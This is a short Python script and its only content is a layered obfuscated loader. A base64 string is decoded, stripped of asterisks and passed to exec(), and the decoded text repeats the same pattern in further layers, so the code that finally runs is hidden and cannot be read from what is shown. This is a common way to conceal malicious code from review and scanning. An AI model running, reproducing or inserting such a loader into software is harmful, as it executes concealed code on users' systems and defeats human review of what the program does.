import base64
hYCHDEEB='aW1wb3J0IGJhc2U2NApoWUNIREVFQj0nYVcxd2IzSjBJR0poYzJVMk5BcG9XVU5JUkVWRlFqMG5ZVmN4ZDJJelNqQkpSMHBvWXpKVk1rNUJjRzlYVlU1SlVrVldSbEZxTUc1WlZtTjRaREpKZWxOcVFrcFNNSEJ2V1hwS1ZrMXJOVUpqUnpsWVZsVTFTbFZyVmxkU2JFWnhUVWMxV2xadFRqUmFSRXBLWld4T2NWRnJjRk5OU0VKMlYxaHdTMVpyTVhKT1ZVcHFVbnBzV1Zac1ZURlRiRlp5Vm14a1UySkZXbmhVVldNeFYyeGFkRlJxVW1GU1JYQkxXbGQ0VDJOV1JuSmpSazVPVTBWS01sWXhhSGRUTVZweVRWaEtUMVpWY0hGVmJuQnpWMVphYzFaVVJsUmlSbHA1Vm0xNGExVXlTa1pYYm1oVlZsZE5lRll5ZUdGa1JsSnhWVzFHVTFKWVFreFhiR1EwVkRKT1YxSnVTbXBTYXpWUFZUQldTMDFzV1hoaFNHUlVUVlp3ZVZSV2FFdFVNVnBXWTBoR1ZtSnVRbnBXTVZwaFl6RmFWVkpzVW1sU2JIQTFWbTB4TkdFeFZYbFRhMXBZWW0xb1ZsWnNaRTVsUmxsNVpVZEdhMUpzU25oV1Z6RkhWVEZLV1ZGcmVGaGlSMUV3VmtSS1QxWXhTblZUYlhCVFlYcFdVRlpVUWxkVE1ERnpWMWhvYUZOSFVsVlVWbHAzWlZaU1YyRkZkRlZOVm5CWFdUQm9SMVp0U25WUmJuQlhUVlp3YUZsNlJtRldWa3B6Vlcxc1UySklRVEZXYlRCNFRrZEZlRlpZYkZSaE1YQlpXVzB4YjFac1duTmFSVFZzVW14c05WcFZaRWRoTVVwelUyNW9WMVo2UmtoV1ZFWkxWMVpHY21WR2FHbFNNVVYzVm10U1MxUXhXWGhUYmxaVVlsaENWRmxZY0ZkVlJscFZVV3hrVkUxRVJucFdNV2h2WVVaT1NGVnNWbFZXYkhBeldsWmFVMVl5Umtaa1JsWk9WbTVDV0ZkVVFtOVNNVnAwVTI1V1VtSnVRbGhVVmxwM1lVWnNObEp0UmxkV2EzQjZWbGN4YzFVeVNrbFJWRVpYWWxSQ05GUnJaRVpsUmxwWllrWlNhRTFZUWxwWFZ6QjRZakZhYzFkdVRtRlNWRlp6VlcxNGMwNVdiRFpVYlRsWFVtdHNNMVl5ZEd0WlZscFhZMFJPVjFJemFFdGFWVnBQWTJzeFYyRkhhRTVYUlVwMlZtMHhkMUl5UlhoVGJrcFFWbTFTV1Zsc2FFTldSbEpZVFZjNVZsSnRVbGxhVldRd1lWZEtWMWR1Y0ZkTlYyaDJWakJrUzFac1pITlhiRlpYWWtaV05GWkdWbUZaVms1SVZXdGtWV0pIYUc5YVYzUmhVekZhYzFrelpFOVdiSEF3VlRKNFYxVXhXa1pUYkdSYVlURndNMVpxUm5kU1ZrcDBVbTF3VGxacmNEWldhMk40WXpGVmVGcEZXbFJpUjNoWVdXdGFTMU5HV2xWVGF6VnNWbXR3ZVZkcldsTmhWMHBHWTBod1YxWXphR2hYVmxwYVpVWldjMWRzYUdsV1ZuQlpWbGN4TkZsVk1VZGpSbHBYWVd0S1dGUlhkSGRTTVZKelYyNWtWMDFyY0ZaVmJYQlBWMnhhYzJOSGFGcGxhM0JMV2xjeFQxSXlSa2RhUlRWT1ZsaEJNVlp0ZUd0a01VMTRVMWhzVlZkSGVGWlpWRXBUVmpGc2MxWnRSbFZOVjNoWldsVmtSMVpYU2toVmJHaFhUV3BGZDFac1ZYaGpNV1IxWTBaa1UyVnNXbGxYVmxwaFUyMVdjMUp1VmxOaVJuQndWVzE0VjA1R1drZFdiVVphVmpGS1NWWkhkR3RXVjBwSlVXeG9XbUV5VVhwYVYzaGhVakZrZEU5V2NGZGlWa3BKVm1wS2QxbFdWWGxTV0d4b1VqSm9XRmxYY3pGa2JGSlZVbTFHYWsxWFVqQmFSVnByVmpKRmVHTkVWbGRTYkhCeVdYcEdXbVZHWkZsalJscFhVbFp3V1ZkV1VrdFZiVkY0WWtaV1UySkdjSE5XYlhNeFpWWmtjbHBIT1ZWaGVrWXhXVlZhUzFZeVNsbFJiRUpYVmtWd1NGVnFSbXRqTVZwelZXMXNWMUl6YURWV01XUXdXVmROZDA1VlpGaGliRXB4V2xkNFlWZEdWblJsU0dSc1ZtMTBNMVp0TVRCV01ERnlZMFp3VjFaNlJuWldha1poVG14S2NtRkdaRTVTTVVwVlZsUkdZV1F4U25SVmEyaHJVbFJXVDFWc1l6Vk9WbHAwVFZoa1UwMVdiRFJXVm1odlZsZEtTRlZzVmxwV1JWb3pWakJhYzFaV1NuVmFSbHBPVmpOb1dsZFVRbGRoTWtWNVUydGthVkpHU2xoWmJHaE9UVlphY2xkdFJtcGlWVFZIVjJ0YWEyRldaRWRUYlRsWFlrZE9ORlZxUm1GV01XUjFVbXhrYVZJeWFIZFdWM0JMWWpGS1YxcEdiR3BTVjFKeFZGWmtVMU5HV2xoT1ZrNXBVbXR3V2xsVldrOVdWbGw2VkZob1ZXRXhjRmRhVmxVeFYxWlNjazVWTldoTk1Fa3hWakZTUTFVeFdYbFNhMXBPVmxkNFYxbHNaRzlYUmxKV1drWk9hMkpIZHpKVmJURXdWMFpaZDJORmJGVk5WMUoyVm1wS1MxZFhSa2hTYkdSb1RXczBNRlpIZEdGVmJWWlhVMjVXVldKRk5XOVpWRVozVjJ4YWRHTkZPVkpOVjNoWVZsZDRZVmRIU25SVmJGWldZbGhvTTFSVlduSmtNWEJKVkd4V2FWWllRa2hYVkVKdlpERmFkRlp1U2xSaWEzQmhXVmQwWVdOc2JEWlNhM1JZVm01Q1NWbFZXazlXTWtwSlVXeGFWMkpVUlRCWFZscHpWakZPY2xwR1ZsaFNNbWhYVjFjeE1HUXhWbk5YYkZaVVlYcHNWbFZ0TVRSV01WbDVUbFU1VmsxVmNIbFViRlpyVmpGWmVsVnRhRmRXUlZwb1ZtMHhSMDVzV25OalJtUlhZbXRKTWxac1pEQlpWbEY0VTI1T1YySnJjRmxaYTFVeFYwWmFjMXBFVG14U2JWSldWVEZvYjFZd01YTlNhbFpXVFc1U2RsWlVTa3RYVmtaMFlVWmtWMUpZUW5sWGExcGhWRzFXV0ZOcmFHcFNNMEpQVlRCV1JtVkdXWGhWYXpsU1RWVndTVlV5ZUd0WFJscEdVMnhzV21FeVVsUldSRVp6WTFaS2RWUnRkRk5oTTBGNFYxUkNhMUl4V1hoVGJsSnJVa1UxV0ZWc1pFOU9SbFY1WXpOb2FtRjZWbGRaVlZwaFlWWmtTR0ZIYUZkU2JWSXpXWHBLVDJNeGNFbFViRlpwVmtkNGQxWkdXbXRWTVZsNFYydG9hMU5GTlZkVVZsWjNWMFpaZVdSSGRGZGlSbXcxV2xWb2MxZHJNVVpPV0VaV1pXdHdTRlZxU2t0U2JGWnpWV3hPVjJFelFrbFdiR1EwVmpGT2NrOVdhRk5oTWxKd1ZXeGFTMVpXVm5OWGEzUlRUVlphZWxadGRIZGhNVmwzVGxSQ1YySlVWbkpaVmxwS1pERmtkVkpzYUdsU1ZGWXhWMWN4TUUxSFRrZGhNM0JWWVROU2MxWnFRVEZOTVZaVlUxaG9WMDFFVmtoWk1GcHZWbFphTm1KSFJscGlSbHBvVkcxNGEyTXhWbk5qUlRWVFYwZG5kMVpVUmxOVE1WRjRVMWhvVkdKck5WbFdhMVp5VFZac1ZWSnVaRmRTTUZwSlZERmFiMVl4V2xWV2EzUlhWak5TV0ZacVJrdGpNVXAxVVcxb1RrMUZXakZWVkVsNFlqRmtjMUpZWkdoU1ZscFVWbXhhWVZKR1ZrZGFSemxZWWtWV00xbFZWbGRWTVZwWFYydFNWVko2Vmt4WmEyUlBVMGRXU0dGR2NFNWlSbG95VlRJMWMyUnRTbkpsUlZKYVRXcFdUVlpXYUVOak1YQldXa1prYUdFelVrbFZNakZ2WVdzeGMxWlliRlZoTURCNFdWWlZNV05XVm5Sa1IwWlhUVVJWZVZZeWRHdFdiVWw1VW10a2FWSldTbFZWYkZwTFVqRldjMVpyY0dwU1dGSlRWVVpSZDJKclRuUmhSbkJTVFVkb1JsVnNWbGRSTVVKWVlVWndVazFIYUVaVmJGWlhVVEI0ZFZOdGVHcFNNMmh2VjFSS1ZtSXdjRFZpTWpWTlVUSk9kVk14Um5kaVIxWklWbTF3VEZJd2NHOVpla3BXVFdzMVJFNVhiRTloYkVweVYyeGtUMlJzY0VoV1Z6bG9VbTE0UlZVd1ZsTlNiRXBXVTFoQ1RGVlVNRGxLZDNCdlYxVk9TVkpGVmtaUmFqRnZWMVZPU1ZKRlZrWlJhVFY1V2xoQ2MxbFhUbXhMUTJOeFNubDNia3A1YTB0YVdHaHNXWGxvYVZsWVRteE9hbEYxV1dwWk1GcEhWbXBpTWxKc1MwZG9XbEV3YUVWU1ZWWkRTMU5yUFNjS2FGbERTRVJGUlVJOWFGbERTRVJGUlVJdWNtVndiR0ZqWlNnbktpY3NKeWNwQ21WNFpXTW9ZbUZ6WlRZMExtSTJOR1JsWTI5a1pTaG9XVU5JUkVWRlFpa3AnCmhZQ0hERUVCPWhZQ0hERUVCLnJlcGxhY2UoJyonLCcnKQpleGVjKGJhc2U2NC5iNjRkZWNvZGUoaFlDSERFRUIpKQ=='
hYCHDEEB=hYCHDEEB.replace('*','')
exec(base64.b64decode(hYCHDEEB))